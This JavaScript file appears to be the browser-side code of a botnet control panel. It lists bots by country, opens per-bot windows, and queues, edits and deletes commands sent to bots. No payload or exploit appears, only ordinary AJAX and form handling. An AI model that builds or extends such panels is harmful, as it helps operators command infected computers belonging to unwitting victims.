function bots_list_country (url) {
	get_hax({
			url: url + '&ajax=1',
			method: 'get',
			id: 'content',
	});
	return false;
}

function bots_list (url) {
	get_hax({
			url: url + '&ajax=1',
			method: 'get',
			id: 'content',
	});
	return false;
}

function bots_get_country (country_code) {
	if(country_code == ''){
		get_hax({
				url: '/bots/country.html?ajax=1',
				method: 'get',
				id: 'content',
		});
	}else{
		get_hax({
				url: '/bots/country-'+country_code+'.html?ajax=1',
				method: 'get',
				id: 'content',
		});
	}
	return false;
}

function get_bot_window(id){
	get_window('/bots/bot-'+id+'.html?window=1', {name:'bot'+id, widht: 800, height: 600});
}

function update_cmd(id){
	if(id != null && id != ''){
		get_hax({
				url: '/bots/jobs-'+id+'.html?ajax=1',
				method: 'get',
				id: 'content',
		});
	}else{
		get_hax({
				url: '/bots/jobs.html?ajax=1',
				method: 'get',
				id: 'content',
		});
	}
}

function delete_cmd(id){
	if(id == 'all'){
		var text = lang['dyvz'];
	}else{
		var text = lang['dydz'];
	}

	if (confirm(text)){
		if(id != null && id != ''){
			get_hax({
					url: '/bots/jobs-'+id+'.html?ajax=1&type=1',
					method: 'get',
					id: 'content',
			});
		}
	}
}

function set_tracking(id, content){
	get_hax({
			url: '/bots/tracking-'+id+'.html?ajax=1&str='+content,
			method: 'get',
			id: content,
			indicator: '<div align="center"><img src="/images/loading.gif" alt="'+lang['load']+'" /></div>',
	});
	return false;
}

function user_cmd(id){
	var cmd = prompt(lang['vskb'],'');
	if(cmd != null && cmd != ''){
		var objSel = document.getElementById('type'+id).options;
		objSel[objSel.length] = new Option(lang['pcmd'] + ': ' + cmd, cmd, null, true);
	}
}

function user_prefix(id){
	var prefix = prompt(lang['vnp'],'');
	if(prefix != null && prefix != ''){
		var azAZ=new RegExp("^[a-zA-Z]+$", "g");
		if(prefix.match(azAZ)){
			var objSel = document.getElementById(id).options;
			objSel[objSel.length] = new Option(prefix, prefix, null, true);
		}else{
			alert(lang['pmstbla']);
			user_prefix(id);
		}
	}
}

function get_bot_window(id){
	get_window('/bots/bot-'+id+'.html?window=1', {name:'bot'+id, widht: 800, height: 600});
	return false;
}

function get_ampie_window(type){
	get_window('/ampie/'+type+'.html?window=1', {name:type, widht: 1000, height: 650});
	return false;
}

function delete_cf(file_name){
	if(confirm(lang['dely']))
	get_hax({
			url: '/bots/config.html?ajax=1&str='+file_name,
			method: 'get',
	});
}

function edit_bot_cmd(obj, uniq){
	if(!document.forms['form'+uniq]){
		myf=document.createElement("form");
		myf.name = 'form'+uniq;
		myf.action = '#';
		
		myt = document.createElement("textarea");
		myt.name = 'cmd'+uniq;
		myt.style.width = '100%';
		myt.value = obj.cells[1].textContent;
		
		myi = document.createElement("input");
		myi.type = 'button';
		myi.value = lang['save'];
		myi.onclick = new Function("e", "save_bot_cmd('"+uniq+"');");
		
		myf.appendChild(myt);
		myf.appendChild(myi);
		
		obj.cells[1].innerHTML = '';
		obj.cells[1].appendChild(myf);
				
		//obj.cells[1].innerHTML = '<form action="#" name="form'+uniq+'"><textarea name="cmd'+uniq+'" style="width:100%;">'+obj.cells[1].textContent+'</textarea><br /><input type="button" value="'+lang['save']+'" onclick="save_bot_cmd('+uniq+');" /></form>';
	}
	return false;
}

function save_bot_cmd(uniq){
	if(checklen(document.forms['form'+uniq].elements['cmd'+uniq], 250) != false){
		get_hax({
			url: '/bots/jobs_bot_edit-'+eval('id_bot_'+uniq)+'.html?ajax=1',
			method: 'post',
			params: 'cmd=' + document.forms['form'+uniq].elements['cmd'+uniq].value,
			id: 'cmdcell' + uniq,
			indicator: '<form action="#" name="form'+uniq+'"><div align="center"><img src="/images/loading.gif" alt="'+lang['load']+'" /></div></form>',
		});
	}
	return false;
}

function edit_bot_cmd_b(obj, uniq){
	if(!document.forms['form'+uniq]){
		myf=document.createElement("form");
		myf.name = 'form'+uniq;
		myf.action = '#';
		
		myt = document.createElement("textarea");
		myt.name = 'cmd'+uniq;
		myt.style.width = '100%';
		myt.value = obj.cells[1].textContent;
		
		myi = document.createElement("input");
		myi.type = 'button';
		myi.value = lang['save'];
		myi.onclick = new Function("e", "save_bot_cmd_b('"+uniq+"');");
		
		myf.appendChild(myt);
		myf.appendChild(myi);
		
		obj.cells[1].innerHTML = '';
		obj.cells[1].appendChild(myf);
		
		//obj.cells[1].innerHTML = '<form action="#" name="form'+uniq+'"><textarea name="cmd'+uniq+'" style="width:100%;" onBlur="save_bot_cmd_b('+uniq+');">'+obj.cells[1].textContent+'</textarea><br /><input type="button" value="'+lang['save']+'" onclick="save_bot_cmd_b('+uniq+');" /></form>';
	}
	return false;
}

function save_bot_cmd_b(uniq){
	if(checklen(document.forms['form'+uniq].elements['cmd'+uniq], 250) != false){
		get_hax({
			url: '/bots/jobs_bot_edit-'+uniq+'.html?ajax=1',
			method: 'post',
			params: 'cmd=' + document.forms['form'+uniq].elements['cmd'+uniq].value,
			id: 'cmdcell' + uniq,
			indicator: '<form action="#" name="form'+uniq+'"><div align="center"><img src="/images/loading.gif" alt="'+lang['load']+'" /></div></form>',
		});
	}
	return false;
}

function edit_comment_b(td, form_name){
	//var id = td.id.replace('cg_', '');
	var id=td.id.split('_');
	if(!comment[id[1] + '' + id[2]]){
		var text = td.innerHTML;
		text = text.replace(/<br>/g, '\n');
		text = text.replace(/<\/?[^>]+>/g, '');
		td.innerHTML = '<textarea name="text_'+id[1] + '_' + id[2]+'" cols="1" rows="1" style="width:99%; height: 60px;" onBlur="save_comment_b(this, '+form_name+');">'+text+'</textarea>';
    	document.forms[form_name].elements['text_' + id[1] + '_' + id[2]].focus();
		comment[id] = true;
    }
}